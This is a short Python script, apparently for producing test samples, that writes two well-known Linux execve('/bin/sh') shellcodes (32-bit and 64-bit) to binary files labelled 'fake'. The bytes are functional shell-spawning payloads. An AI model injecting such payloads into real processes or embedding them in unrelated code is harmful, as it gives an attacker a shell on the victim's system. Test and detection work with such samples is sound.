import os

def generate_fake_shellcodes():
    output_dir = os.path.dirname(os.path.abspath(__file__))

    # Payload 32 bits classique (Linux x86 execve /bin/sh)
    payload_32 = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # push //sh
        b"\x68\x2f\x62\x69\x6e"              # push /bin
        b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b"  # mov ebx, esp; mov al, 11
        b"\xcd\x80"                          # int 0x80 (syscall)
    )

    # Payload 64 bits classique (Linux x86_64 execve /bin/sh)
    payload_64 = (
        b"\x48\x31\xd2"                      # xor    rdx, rdx
        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rbx, '/bin/sh\x00'
        b"\x53"                              # push   rbx
        b"\x48\x89\xe7"                      # mov    rdi, rsp
        b"\x50"                              # push   rax
        b"\x57"                              # push   rdi
        b"\x48\x89\xe6"                      # mov    rsi, rsp
        b"\xb0\x3b"                          # mov    al, 59
        b"\x0f\x05"                          # syscall
    )

    # Écriture des payloads
    with open(os.path.join(output_dir, "fake_shellcode_32.bin"), "wb") as f32:
        f32.write(payload_32)

    with open(os.path.join(output_dir, "fake_shellcode_64.bin"), "wb") as f64:
        f64.write(payload_64)

    print("[*] Fichiers fake_shellcode_32.bin et fake_shellcode_64.bin générés.")

if __name__ == "__main__":
    generate_fake_shellcodes()

